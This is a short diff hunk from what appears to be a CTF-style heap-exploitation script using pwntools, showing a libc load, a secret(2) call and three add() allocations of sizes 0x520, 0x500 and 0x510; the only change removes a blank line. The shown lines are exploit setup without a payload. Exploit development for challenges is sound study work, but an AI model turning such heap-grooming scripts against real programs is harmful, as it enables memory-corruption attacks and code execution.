@@ -144,7 +144,6 @@ libc = ELF("./libc.so.6")
 
 secret(2)
 
-
 add(0x520) #1
 add(0x500) #2
 add(0x510) #3
